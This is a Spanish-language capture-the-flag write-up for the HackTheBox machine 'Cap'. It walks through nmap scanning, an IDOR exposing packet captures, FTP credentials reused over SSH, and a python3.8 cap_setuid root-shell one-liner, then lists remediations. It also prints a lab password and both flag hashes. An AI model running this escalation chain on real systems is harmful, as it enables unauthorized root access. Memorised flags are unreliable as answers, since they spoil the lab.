# 🎯 Cap

## 📊 Resumen
**Plataforma:** HackTheBox

**Máquina:** Cap

**OS:** Linux

**Nivel:** Fácil

**Cadena de Ataque:** Exposición de Datos Sensibles vía Web (IDOR) ➔ Análisis de Tráfico de Red (FTP en texto plano) ➔ Reutilización de Credenciales (SSH) ➔ Escalada de Privilegios por Abuso de Capabilities (`cap_setuid` en Python3.8) ➔ Root

---

## 📝 Ejecución y Explotación

### Pregunta 1

Realizamos un escaneo inicial con el comando:

```
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -v 10.129.40.145
```

Encontramos 3 puertos abiertos, con esta la primera pregunta.
Pasted image 20260423213641.png

Luego de ver los puertos abiertos realizamos un escaneo dirigido hacia ellos:

```
sudo nmap -p 21,22,80 -sC -sV -n -Pn 10.129.40.145
```

Nos encuentra la siguiente información sobre los puertos:
Pasted image 20260423214214.png

```
3
```

### Pregunta 2

Ingresamos por HTTP a la IP 10.129.40.145, dentro nos dirigimos al apartado "Security Snapshot", esperamos que cargue y en pantalla tendremos la respuesta a la segunda pregunta.
Pasted image 20260423222007.png

```
data
```

### Pregunta 3

Al no pedir ninguna autenticación al ingresar al panel web, y como vimos en la captura anterior, podemos cambiar de archivo data, entre todos los existentes, sin importar el usuario, ya que no nos autenticamos nunca, es decir cualquiera con la ruta puede entrar y mirar el resultado de los escaneos.

```
yes
```

### Pregunta 4

*Revisamos las capturas de red creadas en la sección data, vemos que en el archivo de datos 0, se encuentran unos datos interesantes:
Pasted image 20260424201206.png

```
0
```

### Pregunta 5

Como vemos en la captura anterior por el protocolo FTP, se realiza el envío de unas credenciales.

```
FTP
```

### Pregunta 6

*Recordando los puertos abiertos de la máquina, SSH también se encuentra funcionando, vamos y probamos las credenciales obtenidas ahí.

```
SSH
```

### Bandera de Usuario

*Ingresamos por SSH al servidor con las credenciales de nathan.

```
ssh nathan@10.129.41.181
```

Buck3tH4TF0RM3!
Pasted image 20260424202211.png
9dea9b3c3e4728162b7bdcc19da46ec7

### Pregunta 8

Con la pista de la pregunta 8, sabemos que vamos a escalar privilegios mediante un binario, teniendo en cuenta que no encuentra resultados el comando `find / -perm -4000 2>/dev/null`, probamos con los binarios con capabilities:

```
getcap -r / 2>/dev/null
```

Nos muestra los siguientes binarios con permisos específicos.
Pasted image 20260424204001.png
/usr/bin/python3.8

### Bandera de Administrador

*Usando la herramienta searchbins buscamos un payload de escalada de privilegios para el binario python3.
Pasted image 20260424210748.png

Modificamos el payload para nuestro uso y lo ejecutamos en la terminal:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
Pasted image 20260424211122.png

Escalamos a root!

Ahora buscaremos la bandera:
Pasted image 20260424211538.png

```
1a937e93778fda81d947433c7f7bdd95
```

---

## 🧠 Lecciones Aprendidas & Blue Team

**Concepto Nuevo:**  
* **Enumeración de Capabilities en Linux:** Búsqueda de binarios mediante `getcap` que poseen privilegios especiales para ejecutar tareas administrativas sin necesidad de contar con el bit SUID activo, y cómo herramientas o repositorios de referencia (como searchbins o GTFOBins) facilitan su abuso.
* **Fuga de Información Crítica (Information Disclosure):** Interceptación y lectura de archivos de captura de red (PCAP) expuestos públicamente que evidencian el uso de protocolos no seguros.

**Cómo Parcharlo (Fix):** 
1. **Control de Acceso Web (Mitigación IDOR):** Implementar mecanismos de autenticación y autorización obligatorios en el panel web. Ningún recurso que contenga datos sensibles (`/data`) debe ser accesible o indexable por usuarios no autenticados en el sistema.
2. **Cifrado en Tránsito:** Deshabilitar inmediatamente el servicio FTP tradicional (texto plano en el puerto 21). Migrar a protocolos de transferencia seguros que empleen cifrado en todo el canal de comunicación, como **SFTP** (SSH File Transfer Protocol) o **FTPS** (FTP over TLS), mitigando el riesgo de _sniffing_ de credenciales en la red.
3. **Control de Capacidades (Least Privilege):** Retirar la capacidad `cap_setuid` del binario de Python. Se puede realizar ejecutando el comando: `sudo setcap -r /usr/bin/python3.8`. Si se requiere la ejecución de scripts específicos con privilegios, debe configurarse a nivel de archivo `sudoers` apuntando al script exacto de solo lectura, no otorgando la capacidad de escalamiento de UID a todo el intérprete de programación.
4. **Política de Reutilización de Contraseñas:** Auditar e implementar políticas que impidan a los usuarios (como `nathan`) utilizar las mismas credenciales de servicios periféricos (FTP) para accesos directos al sistema (SSH).
